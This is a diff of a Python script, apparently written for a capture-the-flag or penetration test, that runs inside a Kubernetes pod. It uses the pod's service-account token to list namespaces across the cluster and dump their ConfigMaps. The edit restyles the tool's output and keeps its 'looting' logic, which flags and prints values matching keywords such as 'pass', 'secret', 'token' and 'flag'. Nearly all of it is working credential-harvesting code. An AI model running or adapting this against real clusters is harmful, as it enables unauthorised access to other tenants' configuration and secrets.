@@ -8,121 +8,139 @@ TOKEN_PATH = os.path.join(SA_PATH, "token")
 CACERT_PATH = os.path.join(SA_PATH, "ca.crt")
 APISERVER = "https://kubernetes.default.svc"
 
-# === VISUALS ===
+# === STYLING ENGINE ===
 class C:
-    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; M = "\033[95m"; E = "\033[0m"
-    BOLD = "\033[1m"
+    # Foreground
+    W = "\033[97m"; G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"
+    B = "\033[94m"; C = "\033[96m"; M = "\033[95m"; GR = "\033[90m"
+    # Decorators
+    BOLD = "\033[1m"; CLR = "\033[0m"
 
-def section(title):
-    print(f"\n{C.B}{'='*40}{C.E}")
-    print(f"{C.B} {title}{C.E}")
-    print(f"{C.B}{'='*40}{C.E}")
+def banner():
+    print(f"""{C.C}{C.BOLD}
+   __ __ ___  _____   _____   ___ 
+  / // /|_  ||___ /  | ____| / _ \\ 
+ / // /_ _| |  |_ \\  |  _|  | | | |
+/ __ \/ __| | ___) | | |___ | |_| |
+\/  \/____/_||____/  |_____| \___/ 
+                       v7.0 (Deep Read){C.CLR}
+    """)
+    time.sleep(1)
+
+def header(title, icon="🔎"):
+    print(f"\n{C.B}╔{'═'*60}╗{C.CLR}")
+    print(f"{C.B}║ {icon} {title:<56} ║{C.CLR}")
+    print(f"{C.B}╚{'═'*60}╝{C.CLR}")
     time.sleep(0.5)
 
-def info(msg):
-    print(f"{C.C}[*] {msg}{C.E}")
-    time.sleep(0.1)
+def loot_box(key, value):
+    val_len = len(value)
+    width = max(val_len + 4, 40)
+    if width > 60: width = 60
+    
+    print(f"\n   {C.R}╔{'═'*width}╗{C.CLR}")
+    print(f"   {C.R}║ 🚨 CRITICAL KEYWORD MATCH ({key}){' '*(width-30-len(key))} ║{C.CLR}")
+    print(f"   {C.R}╚{'═'*width}╝{C.CLR}")
 
-def success(msg):
-    print(f"{C.G}[+] {msg}{C.E}")
-    time.sleep(0.1)
+def print_file_content(content, limit_lines=20):
+    lines = content.split('\n')
+    total_lines = len(lines)
+    
+    # Header line
+    print(f"{C.GR}   ┌{'─'*50}{C.CLR}")
+    
+    for i, line in enumerate(lines[:limit_lines]):
+        # Clean up line for display
+        clean_line = line.replace('\t', '  ').rstrip()
+        print(f"{C.GR}   │ {C.W}{clean_line}{C.CLR}")
+    
+    if total_lines > limit_lines:
+        print(f"{C.GR}   │ {C.Y}... [truncated {total_lines - limit_lines} more lines] ...{C.CLR}")
+    
+    print(f"{C.GR}   └{'─'*50}{C.CLR}")
+    time.sleep(0.2)
 
-def fail(msg):
-    print(f"{C.R}[-] {msg}{C.E}")
-
-# === SETUP ===
+# === K8S API ===
 if not os.path.exists(TOKEN_PATH):
-    fail("FATAL: No Service Account found.")
-    sys.exit(1)
+    print(f"{C.R}❌ FATAL: No Service Account Token found.{C.CLR}"); sys.exit(1)
 
 with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
 with open(os.path.join(SA_PATH, "namespace")) as f: MY_NS = f.read().strip()
 SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)
 
 def k8s_api(path):
-    url = f"{APISERVER}{path}"
-    req = Request(url, headers={"Authorization": f"Bearer {TOKEN}"})
+    req = Request(f"{APISERVER}{path}", headers={"Authorization": f"Bearer {TOKEN}"})
     try:
         with urlopen(req, context=SSL_CTX, timeout=3) as res:
             return json.loads(res.read())
-    except Exception: return None
+    except: return None
 
-# === MAIN LOGIC ===
-print(f"\n{C.M}   >>> K8s DYNAMIC ENUMERATOR v5.0 <<<{C.E}")
-print(f"   Pod Namespace: {C.BOLD}{MY_NS}{C.E}")
-time.sleep(1)
+# === MAIN RUNNER ===
+banner()
+print(f"{C.GR}   [+] Pod Context: {C.W}{MY_NS}{C.CLR}")
 
-# --- 1. NAMESPACES ---
-section("1. DISCOVERING TARGET NAMESPACES")
-info(" querying API for namespace list...")
+# --- 1. DISCOVERY ---
+header("PHASE 1: TARGET ACQUISITION")
+print(f"{C.GR}   [i] Querying API for available namespaces...{C.CLR}")
 
 namespaces = []
 resp = k8s_api("/api/v1/namespaces")
 
 if resp and "items" in resp:
-    namespaces = [item["metadata"]["name"] for item in resp["items"]]
-    success(f"API Access Granted! Found {len(namespaces)} namespaces.")
+    namespaces = [i["metadata"]["name"] for i in resp["items"]]
+    print(f"   {C.G}✔ API Access Granted.{C.CLR}")
+    print(f"   {C.G}✔ Discovered {len(namespaces)} Namespaces.{C.CLR}")
 else:
-    fail("API Access Denied for namespace listing.")
-    info("Falling back to local namespace only.")
+    print(f"   {C.R}✖ API Access Denied (Listing).{C.CLR}")
     namespaces = [MY_NS]
 
-print(f"\n   Targets identified: {C.Y}{', '.join(namespaces)}{C.E}")
-time.sleep(1.5)
-
-# --- 2. CONFIGMAP LOOTING ---
-section("2. LOOTING CONFIGMAPS")
-info("Scanning all identified namespaces for config data...")
-time.sleep(1)
+# --- 2. LOOTING ---
+header("PHASE 2: DEEP SCAN", "🔓")
 
 for ns in namespaces:
-    print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
-    print(f"   {'-'*30}")
+    # Visual Separator for Namespace
+    print(f"{C.C}┌── 📂 NAMESPACE: {C.BOLD}{ns.upper()}{C.CLR}")
     
-    # Try to fetch
     cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
     
     if not cm_resp or "items" not in cm_resp:
-        fail(f"Access Denied to ConfigMaps in '{ns}'")
-        time.sleep(0.2)
+        print(f"{C.C}└── {C.R}✖ Access Denied{C.CLR}\n")
         continue
-
+    
     items = cm_resp['items']
-    count = len(items)
-    
-    if count == 0:
-        print(f"   (No ConfigMaps found)")
+    if not items:
+        print(f"{C.C}└── {C.GR}(Empty){C.CLR}\n")
         continue
 
-    success(f"Found {count} ConfigMaps! Analyzing content...")
-    
-    for cm in items:
+    # Process files
+    last_idx = len(items) - 1
+    for i, cm in enumerate(items):
         name = cm['metadata']['name']
-        if name == "kube-root-ca.crt": continue 
+        is_last = (i == last_idx)
+        prefix = "└──" if is_last else "├──"
         
-        print(f"   > File: {C.BOLD}{name}{C.E}")
+        # Skip noise
+        if "kube-root" in name or "istio-ca" in name:
+            print(f"{C.C}│   {prefix} {C.GR}{name} (Skipped){C.CLR}")
+            continue
+
+        print(f"{C.C}│   {prefix} {C.Y}📄 {name}{C.CLR}")
         
         if "data" in cm:
             for key, val in cm["data"].items():
-                # Check for sensitive keywords
-                keywords = ["flag", "pass", "key", "secret", "user", "admin", "token", "jwt", "auth"]
-                is_sus = any(k in val.lower() or k in key.lower() for k in keywords)
+                pipe = "    " if is_last else "│   "
+                print(f"{C.C}│   {pipe}    👉 {C.C}{key}{C.CLR}")
                 
-                if is_sus:
-                    print(f"     🚨 {C.G}POTENTIAL FLAG/SECRET FOUND ({key}):{C.E}")
-                    print(f"{C.G}{'-'*20}{C.E}")
-                    print(f"{val.strip()}")
-                    print(f"{C.G}{'-'*20}{C.E}")
-                    time.sleep(0.5) # Pause to let the user see the loot
-                else:
-                    preview = val[:60].replace('\n', ' ')
-                    if len(val) > 60: preview += "..."
-                    print(f"     - {key}: {preview}")
-        else:
-            print("     (No data keys)")
-    
-    time.sleep(0.5)
+                # Check keywords for Alert Box
+                keywords = ["flag", "pass", "key", "secret", "user", "admin", "token"]
+                if any(k in val.lower() or k in key.lower() for k in keywords):
+                    loot_box(key, val)
 
-section("SCAN COMPLETE")
-print(f"{C.G}Enumeration finished.{C.E}")
+                # ALWAYS print the first 20 lines neatly
+                print_file_content(val, 20)
+                
+    print(f"{C.C}│{C.CLR}") 
+
+header("SCAN COMPLETE", "🏁")
+print(f"{C.G}   Enumeration finished.{C.CLR}\n")
 EOF
